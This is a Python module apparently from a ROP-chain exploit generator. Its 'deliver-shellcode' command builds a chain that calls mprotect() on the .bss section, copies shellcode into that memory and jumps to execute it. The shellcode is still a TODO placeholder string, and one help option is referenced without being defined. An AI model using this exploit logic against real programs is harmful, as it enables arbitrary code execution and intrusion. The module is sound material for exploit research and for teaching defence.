# -*- coding:utf-8 -*-  
# DeliverShellcode module: exploit type: copy shellcode into memory then execute it

from ropgenerator.IO import string_bold, string_special, banner, error, notify, info, verbose
from ropgenerator.Constraints import Constraint, Assertion, BadBytes
from ropgenerator.exploit.Utils import STRtoMEM
from ropgenerator.exploit.syscalls.Linux32 import build_mprotect32
from ropgenerator.exploit.syscalls.Linux64 import build_mprotect64
from ropgenerator.exploit.Scanner import getSectionAddress
from ropgenerator.semantic.Engine import search
from ropgenerator.Database import QueryType
import ropgenerator.Architecture as Arch 

################################
#  DELIVER-SHELLCODE COMMAND   # 
################################

CMD_DSHELL_HELP =  banner([string_bold("'deliver-shellcode' command"),\
                    string_special("(Deliver a shellcode & Execute it)")])
CMD_DSHELL_HELP += "\n\n\t"+string_bold("Description:")+\
"\n\t\tThis method tries to create an executable memory area"+\
"\n\t\t, then copy a given shellcode into this area, and then"+\
"\n\t\t jump to execute this shellcode"

OPTION_ADDRESS = '-a'
OPTION_ADDRESS_SHORT = "--address"


CMD_DSHELL_HELP += "\n\n\t"+string_bold("Options")+":"
CMD_DSHELL_HELP += "\n\n\t\t"+string_special(OPTION_ADDRESS_SHORT)+","+string_special(OPTION_ADDRESS)+" <int>\t Address where to deliver shellcode"

CMD_DSHELL_HELP += "\n\n\t"+string_bold("Examples")+": "+\
    "\n\t\tNo examples yet"
    
def print_help():
    print(CMD_DSHELL_HELP)
    

def dshell(args, constraint, assertion, lmax):
            
    address = None
    seenAddress = False
    
    # Parse options    
    i = 0 
    while i < len(args):
        if( args[i][0] == '-' ):
            if( args[i] in [OPTION_ADDRESS_SHORT, OPTION_ADDRESS]):
                if( seenAddress ):
                    error("Error. '" + args[i] + "' option should be used only once")
                    return None 
                if( i+1 >= len(args)):
                    error("Error. Missing address after option '"+args[i]+"'")
                    return 
                seenAddress = True
                try:
                    address = int(args[i+1])
                except:
                    try:
                        address = int(args[i+1], 16)
                    except:
                        error("Error. '" + args[i+1] +"' bytes is not valid")
                        return None 
                i = i +1 
                seenAddress = True
            elif( args[i] in [OPTION_HELP, OPTION_HELP_SHORT]):
                        print_help()
                        return None 
        else:
            error("Error. Unknown option '{}'".format(args[i]))
            return None 
            
    # Build the exploit 
    # TODO lalala
    print("")
    info("Building exploit: deliver-shellcode strategy\n")
    res = build_dshell(constraint, assertion, address, lmax)
    return res
    

def build_dshell(constraint, assertion, address, lmax ):
                        
    # Build exploit
    #################
    
    # Choose shellcode 
    # TODO 
    shellcode = "binlssystemstrcpybashcat"
    addr_str = None
    
    #Find address for the payload 
    if( not address ):
        # Get the .bss address 
        # TODO 
        notify("Getting delivery address for shellcode")
        address = getSectionAddress('.bss')
        addr_str = ".bss" 
        if( not address ):
            verbose("Couldn't find .bss address")
            return []
        
    # Building mprotect 
    notify("Building mprotect() chain")
    if( Arch.currentArch == Arch.ArchX86 ):
        mprotect_chain = build_mprotect32(address, len(shellcode)+1, 7)
    elif( Arch.currentArch == Arch.ArchX64 ):
        mprotect_chain = build_mprotect64(address, len(shellcode)+1, 7)
    else:
        mprotect_chain = 0 
        verbose("mprotect call not supported for architecture {}".format(Arch.currentArch.name))
        return []
    verbose("Done")
    
    # Deliver shellcode 
    notify("Building chain to copy shellcode in memory")
    STRtoMEM_chain = STRtoMEM(shellcode, address, constraint, assertion, lmax, addr_str=addr_str, hex_info=True)
    if( not STRtoMEM_chain ):
        verbose("Could not copy shellcode into memory")
        return []
     
    notify("Searching chain to jump to shellcode")    
    # Jump to shellcode 
    jmp_shellcode_chains = search(QueryType.CSTtoREG, Arch.ipNum(), address, constraint, assertion, clmax=lmax)
    if( not jmp_shellcode_chains ):
        verbose("Couldn't find a jump to the shellcode")
        return []
        
    notify("Done")
    return mprotect_chain.addChain(STRtoMEM_chain).addChain(jmp_shellcode_chains[0])
